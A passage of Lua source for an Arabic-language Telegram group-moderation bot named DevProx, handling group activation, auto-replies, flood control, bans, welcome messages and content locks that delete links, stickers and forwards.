if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = JSON:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end
end
DevAbs:set(DevProx.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
Dev_Abs(tostring((DevAbs:get(DevProx.."bot:leader:gr") or bot_owner)), 0, 1, "🏆┇ تم تفعيل مجموعه جديده  \n📤┇ ايدي الضافني ~ {"..msg.sender_user_id_.."}\n🚸┇ معرف الضافني ~ @"..(result.username_ or "لا يوجد").."\n📥┇ معلومات المجموعه  \n\n📂┇ ايدي المجموعه ~ {"..msg.chat_id_.."}\n🛢┇ اسم المجموعه  {"..A2.title_.."}\n☑️┇ رابط المجموعه \n🚠┇  {"..(t2.invite_link_ or "Error").."}" , 1, 'html') 
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, dl_cb222, nil)
end
openChat(msg.chat_id_,DevProx) 
DevAbs:set(DevProx.."bot:enable:"..msg.chat_id_,true)
DevAbs:setex(DevProx.."bot:charge:"..msg.chat_id_,86400,true)
DevAbs:sadd("DevProx:addg"..bot_id, msg.chat_id_)
end end
getUser(msg.sender_user_id_,adding) 
end end
--     Source DevProx     --
if (data.ID == "UpdateNewMessage") then
local msg = data.message_
--vardump(data)
local d = data.disable_notification_
local chat = chats[msg.chat_id_]
faedr(data.message_,data) 
----------------OLD MSG--------------------
if msg.date_ < (os.time() - 30) then
print("**** OLD MSG ****")
return false
end
--         Source DevProx         --
-------  Expire & AutoLeave  -------
-----------  Secretary  ------------
if DevAbs:get(DevProx.."clerk") == "On" then
function clerk(extra, result, success)
local id = tostring(msg.chat_id_)
if id:match("^(%d+)") then
if not is_admin(msg.sender_user_id_) then
local text = DevAbs:get(DevProx.."textsec")
if not DevAbs:get(DevProx.."secretary:"..msg.chat_id_) then
if text then
local text = text:gsub('FIRSTNAME',(result.first_name_ or ''))
local text = text:gsub('LASTNAME',(result.last_name_ or ''))
local text = text:gsub('USERNAME',('@'..result.username_ or ''))
local text = text:gsub('USERID',(result.id_ or ''))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
DevAbs:setex(DevProx.."secretary:"..msg.chat_id_,86400,true)
return false
else
return ""
end
end
end
end
end
getUser(msg.sender_user_id_,clerk)
end
--     Source DevProx     --
local idf = tostring(msg.chat_id_)
if not DevAbs:get(DevProx.."bot:enable:"..msg.chat_id_) and not idf:match("^(%d+)") and not is_admin(msg.sender_user_id_, msg.chat_id_) then
print("Return False [ Not Enable ]")
return false
end
--     Source DevProx     --
if msg and msg.send_state_.ID == "MessageIsSuccessfullySent" then
function get_mymsg_contact(extra, result, success)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,get_mymsg_contact)
return
end
--     Source DevProx     --
DevAbs:incr(DevProx.."bot:allmsgs")
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match('-100(%d+)') then
if msg.can_be_deleted_ == true then 
DevAbs:sadd(DevProx.."bot:groups",msg.chat_id_)
end
if not DevAbs:sismember(DevProx.."bot:groups",msg.chat_id_) then
DevAbs:sadd(DevProx.."bot:groups",msg.chat_id_)
end
elseif id:match('^(%d+)') then
if not DevAbs:sismember(DevProx.."bot:userss",msg.chat_id_) then
DevAbs:sadd(DevProx.."bot:userss",msg.chat_id_)
end
else
if not DevAbs:sismember(DevProx.."bot:groups",msg.chat_id_) then
DevAbs:sadd(DevProx.."bot:groups",msg.chat_id_)
end
end
end
--          Source DevProx          --
------------  MSG TYPES  -------------
if msg.content_ then
if msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" then
print("This is [ Inline ]")
msg_type = 'MSG:Inline'
end

if msg.content_.ID == "MessageText" then
text = msg.content_.text_
print("This is [ Text ]")
msg_type = 'MSG:Text'
end
--     Source DevProx     --
 if msg.content_.ID == "MessageChatAddMembers" then
DevAbs:incr(DevProx..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)
end

if msg.content_.ID == "MessagePhoto" then
DevAbs:incr(DevProx.."Photo:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end

if msg.content_.ID == "MessageAnimation" then
DevAbs:incr(DevProx.."Gif:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end

if msg.content_.ID == "MessageVideo" then
DevAbs:incr(DevProx.."Video:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end

if msg.content_.ID == "MessageVoice" then
DevAbs:incr(DevProx.."Voice:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end

if msg.content_.ID == "MessageSticker" then
DevAbs:incr(DevProx.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end

--     Source DevProx     --
if msg.content_.ID == "MessagePhoto" then
print("This is [ Photo ]")
msg_type = 'MSG:Photo'
end
--     Source DevProx     --
if msg.content_.ID == "MessageChatAddMembers" then
print("This is [ New User Add ]")
msg_type = 'MSG:NewUserAdd'
end
--     Source DevProx     --
if msg.content_.ID == "MessageDocument" then
print("This is [ File Or Document ]")
msg_type = 'MSG:Document'
end
--     Source DevProx     --
if msg.content_.ID == "MessageSticker" then
print("This is [ Sticker ]")
msg_type = 'MSG:Sticker'
end
--     Source DevProx     --
if msg.content_.ID == "MessageAudio" then
print("This is [ Audio ]")
msg_type = 'MSG:Audio'
end
--     Source DevProx     --
if msg.content_.ID == "MessageVoice" then
print("This is [ Voice ]")
msg_type = 'MSG:Voice'
end
--     Source DevProx     --
if msg.content_.ID == "MessageVideo" then
print("This is [ Video ]")
msg_type = 'MSG:Video'
end
--     Source DevProx     --
if msg.content_.ID == "MessageAnimation" then
print("This is [ Gif ]")
msg_type = 'MSG:Gif'
end
--     Source DevProx     --
if msg.content_.ID == "MessageLocation" then
print("This is [ Location ]")
msg_type = 'MSG:Location'
end
--     Source DevProx     --
if msg.content_.ID == "MessageChatJoinByLink" then
print("This is [ Msg Join By link ]")
msg_type = 'MSG:NewUser'
end
--     Source DevProx     --
if not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
print("This is [ MarkDown ]")
msg_type = 'MSG:MarkDown'
end
--     Source DevProx     --
if msg.content_.ID == "MessageChatJoinByLink" then
print("This is [ Msg Join By Link ]")
msg_type = 'MSG:JoinByLink'
end
--     Source DevProx     --
if msg.content_.ID == "MessageContact" then
print("This is [ Contact ]")
msg_type = 'MSG:Contact'
end
end
--     Source DevProx     --
if ((not d) and chat) then
if msg.content_.ID == "MessageText" then
do_notify (chat.title_, msg.content_.text_)
else
do_notify (chat.title_, msg.content_.ID)
end
end
--     Source DevProx     --
if msg.content_.photo_ then
if DevAbs:get(DevProx..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_
else
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end

Dev_Abs(msg.chat_id_, msg.id_, 1, '🎢❗️ تـۖم تغيير صـۄرة ٱڵمجـمۄعة\n', 1, 'md') 
DevAbs:del(DevProx..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_)
setphoto(msg.chat_id_, photo_id)
end end


text = msg.content_.text_ if msg.content_.text_ or msg.content_.video_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ then 
local content_text = DevAbs:get(DevProx..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_text == 'save_repgp' then DevAbs:del(DevProx..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
local content_text = DevAbs:get(DevProx..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
if msg.content_.video_ then DevAbs:set(DevProx..'video_repgp'..content_text..''..msg.chat_id_..'', msg.content_.video_.video_.persistent_id_)
end

if msg.content_.sticker_ then DevAbs:set(DevProx..'stecker_repgp'..content_text..''..msg.chat_id_..'', msg.content_.sticker_.sticker_.persistent_id_) 
end 

if msg.content_.voice_ then DevAbs:set(DevProx..'voice_repgp'..content_text..''..msg.chat_id_..'', msg.content_.voice_.voice_.persistent_id_) 
end

if msg.content_.animation_ then DevAbs:set(DevProx..'gif_repgp'..content_text..''..msg.chat_id_..'', msg.content_.animation_.animation_.persistent_id_) 
end 

if msg.content_.text_ then
DevAbs:set(DevProx..'text_repgp'..content_text..''..msg.chat_id_..'', msg.content_.text_)
end 

DevAbs:sadd('rep_owner'..msg.chat_id_..'',content_text) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم حـفـظ ٱڵـرد \n', 1, 'md') 
DevAbs:del(DevProx..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
return false 
end 
end

if msg.content_.text_ and not DevAbs:get(DevProx..'lock_reeeep'..msg.chat_id_) then 
if DevAbs:get(DevProx..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(DevProx..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end 

if DevAbs:get(DevProx..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(DevProx..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end

if DevAbs:get(DevProx..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(DevProx..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end 

if DevAbs:get(DevProx..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(DevProx..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..''))
end

if DevAbs:get(DevProx..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
Dev_Abs(msg.chat_id_, msg.id_, 1, DevAbs:get(DevProx..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'') , 1, 'md') 
end end

text = msg.content_.text_
if msg.content_.text_  or msg.content_.video_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ then
local content_text = DevAbs:get(DevProx.."add:repallt"..msg.sender_user_id_)
if content_text == 'save_rep' then
DevAbs:del(DevProx.."add:repallt"..msg.sender_user_id_)
local content_text = DevAbs:get(DevProx.."addreply2:"..msg.sender_user_id_)
if msg.content_.video_ then
DevAbs:set(DevProx.."video_repall"..content_text, msg.content_.video_.video_.persistent_id_)
end

if msg.content_.sticker_ then
DevAbs:set(DevProx.."stecker_repall"..content_text, msg.content_.sticker_.sticker_.persistent_id_)
end

if msg.content_.voice_ then
DevAbs:set(DevProx.."voice_repall"..content_text, msg.content_.voice_.voice_.persistent_id_)
end

if msg.content_.animation_ then
DevAbs:set(DevProx.."gif_repall"..content_text, msg.content_.animation_.animation_.persistent_id_)
end

if msg.content_.text_ then
DevAbs:set(DevProx.."text_repall"..content_text, msg.content_.text_)
end 

DevAbs:sadd('rep_sudo',content_text)
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم حـفـظ ٱڵـرد \n', 1, 'md') 
DevAbs:del(DevProx.."addreply2:"..msg.sender_user_id_)
return false end end
if msg.content_.text_ and not DevAbs:get(DevProx..'lock_reeeep'..msg.chat_id_) then
if DevAbs:get(DevProx.."video_repall"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(DevProx.."video_repall"..msg.content_.text_))
end

if DevAbs:get(DevProx.."voice_repall"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(DevProx.."voice_repall"..msg.content_.text_))
end

if  DevAbs:get(DevProx.."gif_repall"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(DevProx.."gif_repall"..msg.content_.text_))
end

if DevAbs:get(DevProx.."stecker_repall"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(DevProx.."stecker_repall"..msg.content_.text_))
end

if DevAbs:get(DevProx.."text_repall"..msg.content_.text_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, DevAbs:get(DevProx.."text_repall"..msg.content_.text_) ,  1, "md")
end
end 
-- end functions -- Source DevProx  --

----------------------------------------Anti FLood---------------------------------------------
--------------Flood Max --------------DevProx
local flmax = 'flood:max:'..msg.chat_id_
if not DevAbs:get(DevProx..flmax) then
floodMax = 5
else
floodMax = tonumber(DevAbs:get(DevProx..flmax))
end
-----------------End-------------------
-----------------Msg-------------------DevProx
local pm = 'flood:'..msg.sender_user_id_..':'..msg.chat_id_..':msgs'
if not DevAbs:get(DevProx..pm) then
msgs = 0
else
msgs = tonumber(DevAbs:get(DevProx..pm))
end
-----------------End-------------------
------------Flood Check Time-----------
local TIME_CHECK = 2
-----------------End-------------------
-------------Flood Check---------------DevProx
local absflood = 'anti-flood:'..msg.chat_id_
if msgs > (floodMax - 1) then
if DevAbs:get(DevProx..'floodstatus'..msg.chat_id_) == 'Kicked' then
del_all_msgs(msg.chat_id_, msg.sender_user_id_)
chat_kick(msg.chat_id_, msg.sender_user_id_)
local DevProx = '📤┇ الدوده ('..msg.sender_user_id_..') \n📛┇ قام بالتكرار المحدد تم طرده  '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 12, string.len(msg.sender_user_id_))
elseif DevAbs:get(DevProx..'floodstatus'..msg.chat_id_) == 'DelMsg' then
del_all_msgs(msg.chat_id_, msg.sender_user_id_)
else
del_all_msgs(msg.chat_id_, msg.sender_user_id_)
end
end
-----------------End-------------------
local sendDevProx = function(chat_id, reply_to_message_id, text, offset, length, userid)
tdcli_function({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID = "InputMessageText",
text_ = text,
disable_web_page_preview_ = 1,
clear_draft_ = 0,
entities_ = {
[0] = {
ID = "MessageEntityMentionName",
offset_ = offset,
length_ = length,
user_id_ = userid
}
}
}
}, dl_cb, nil)
end
--------------ANTI ATTACK-------------DevProx
local pmonpv = 'antiattack:'..msg.sender_user_id_..':'..msg.chat_id_..':msgs'
if not DevAbs:get(DevProx..pmonpv) then
msgsonpv = 0
else
msgsonpv = tonumber(DevAbs:get(DevProx..pmonpv))
end
if msgsonpv > (13 - 1) then
blockUser(msg.sender_user_id_)
end
local idmem = tostring(msg.chat_id_)
if idmem:match("^(%d+)") then
DevAbs:setex(DevProx..pmonpv, TIME_CHECK, msgsonpv+1)
end
local Time = os.date("%X")
if Time == "01:34" then
Dev_Abs(msg.chat_id_, msg.id_, 1, 'هلو الساعه ب 1:34', 1, 'md')
print('الكود')
end
-------------------------------------- Process mod --------------------------------------------
local check_username = function(extra, result, success)
local fname = result.first_name_ or ""
local lname = result.last_name_ or ""
local name = fname .. " " .. lname
local username = result.username_
local svuser = "user:Name" .. result.id_
local id = result.id_
if username then
DevAbs:set(DevProx..svuser, "@" .. username)
else
DevAbs:set(DevProx..svuser, name)
end
end
getUser(msg.sender_user_id_, check_username)
-----------------------------******** START MSG CHECKS DevProx ********----------------------------------------
-----------------------------------DevProx--------------------------------------------------------------------
if is_banned(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
chat_kick(msg.chat_id_, msg.sender_user_id_)
return
end
if is_muted(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
return
end
if is_gbanned(msg.sender_user_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
chat_kick(msg.chat_id_, msg.sender_user_id_)
delete_msg(chat,msgs)
return
end
if DevAbs:get(DevProx..'bot:muteall'..msg.chat_id_) and not is_momod(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
return
end 
DevAbs:incr(DevProx..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevAbs:incr(DevProx..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
DevAbs:incr(DevProx..'group:msgs'..msg.chat_id_)
if msg.content_.ID == "MessagePinMessage" then
if DevAbs:get(DevProx..'pinnedmsg'..msg.chat_id_) and DevAbs:get(DevProx..'bot:pin:mute'..msg.chat_id_) then
unpinmsg(msg.chat_id_)
local pin_id = DevAbs:get(DevProx..'pinnedmsg'..msg.chat_id_)
pinmsg(msg.chat_id_,pin_id,0)
end
end
if DevAbs:get(DevProx..'bot:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
end
DevAbs:del(DevProx..'bot:viewget'..msg.sender_user_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ The more hits you : '..msg.views_..' seen ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ مشاهدات المنشور  '..msg.views_..' تقريبا ', 1, 'md')
end
DevAbs:del(DevProx..'bot:viewget'..msg.sender_user_id_)
end
end
--Photo
--Photo
------- --- Photo--------- DevProx
-- -----------------Photo
--Photo
--Photo
if msg_type == 'MSG:Photo' then
if not is_VipGroup(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(DevProx..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Photo]")
end
end
end
if DevAbs:get(DevProx..'bot:photo:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Photo]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Photo]")
if DevAbs:get(DevProx..'bot:strict'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
end
end
end
if DevAbs:get(DevProx..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Photo]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(DevProx..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Photo]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(DevProx..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Photo]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(DevProx..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Photo]")
end
end
end
end
--Markdown
--Markdown
------- --- Markdown---------DevProx
-- -----------------Markdown
--Markdown
--Markdown
elseif msg_type == 'MSG:MarkDown' then
if DevAbs:get(DevProx..'markdown:lock'..msg.chat_id_) then
if not is_VipGroup(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end
end
--Document
--Document
------- --- Document--------- DevProx
-- -----------------Document
--Document
--Document
elseif msg_type == 'MSG:Document' then
if not is_VipGroup(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(DevProx..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Document]")
end
end
end
if DevAbs:get(DevProx..'bot:document:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Document]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Document]")
if DevAbs:get(DevProx..'bot:strict'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
end
end
end
if DevAbs:get(DevProx..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Document]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(DevProx..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Document]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(DevProx..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Document]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(DevProx..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Document]")
end
end
end
end
--Inline
--Inline
------- --- Inline---------DevProx
-- -----------------Inline
--Inline
--Inline
elseif msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and msg.via_bot_user_id_ ~= 0 then
if not is_VipGroup(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(DevProx..pm, TIME_CHECK, msgs+1)
end
if DevAbs:get(DevProx..'bot:inline:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Inline]")
end
end
--Sticker
--Sticker
------- --- Sticker---------DevProx
-- -----------------Sticker
--Sticker
--Sticker
elseif msg_type == 'MSG:Sticker' then
if not is_VipGroup(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(DevProx..pm, TIME_CHECK, msgs+1)
end
if DevAbs:get(DevProx..'bot:sticker:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Sticker]")
end
end
elseif msg_type == 'MSG:JoinByLink' then
if DevAbs:get(DevProx..'bot:tgservice:jk'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_ 
 delete_msg(chat,msgs)
print("Deleted [Lock] [Tgservice] [JoinByLink]")
return
end
function get_welcome(extra,result,success)
if DevAbs:get(DevProx..'welcome:'..msg.chat_id_) then
text = DevAbs:get(DevProx..'welcome:'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = 'Hi {firstname} Welcome To Group '
else
text = '❗️☻ أهـلاً بِـك عـزيـزي    {firstname}\n🙎🏻‍♂️ • مُعرفـك :  @{username} \n⛔️❗️ ٱڵـتـزم بٱڵـقوانين ڵـتجنب ٱڵـطرد '
end
end
local text = text:gsub('{firstname}',(result.first_name_ or ''))
local text = text:gsub('{lastname}',(result.last_name_ or ''))
local text = text:gsub('{username}',(result.username_ or ''))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
if DevAbs:get(DevProx.."bot:welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--New User Add
--New User Add
------- --- New User Add---------DevProx
-- -----------------New User Add
--New User Add
--New User Add
elseif msg_type == 'MSG:NewUserAdd' then
if DevAbs:get(DevProx..'bot:tgservice:jk'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tgservice] [NewUserAdd]")
return
end
if msg.content_.members_[0].username_ and msg.content_.members_[0].username_:match("[Bb][Oo][Tt]$") then
if not is_momod(msg.content_.members_[0].id_, msg.chat_id_) then
if DevAbs:get(DevProx..'bot:bots:gkgk'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.content_.members_[0].id_)
return false
end
end
end
if is_banned(msg.content_.members_[0].id_, msg.chat_id_) then
chat_kick(msg.chat_id_, msg.content_.members_[0].id_)
return false
end
if DevAbs:get(DevProx.."bot:welcome"..msg.chat_id_) then
if DevAbs:get(DevProx..'welcome:'..msg.chat_id_) then
text = DevAbs:get(DevProx..'welcome:'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = 'Hi Welcome To Group'
else
text = '❗️☻ أهـلاً بِـك عـزيـزي    {firstname}\n🙎🏻‍♂️ • مُعرفـك :  @{username} \n⛔️❗️ ٱڵـتـزم بٱڵـقوانين ڵـتجنب ٱڵـطرد '
end
end
local text = text:gsub('{firstname}',(msg.content_.members_[0].first_name_ or ''))
local text = text:gsub('{lastname}',(msg.content_.members_[0].last_name_ or ''))
local text = text:gsub('{username}',('@'..msg.content_.members_[0].username_ or ''))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
--Contact
--Contact
------- --- Contact---------DevProx
-- -----------------Contact
--Contact
--Contact
elseif msg_type == 'MSG:Contact' then
if not is_VipGroup(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(DevProx..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Contact]")
end
end
end
if DevAbs:get(DevProx..'bot:contact:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Contact]")
end
end
--Audio
--Audio
------- --- Audio---------DevProx
-- -----------------Audio
--Audio
--Audio
elseif msg_type == 'MSG:Audio' then
if not is_VipGroup(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(DevProx..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Audio]")
end
end
end
if DevAbs:get(DevProx..'bot:music:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
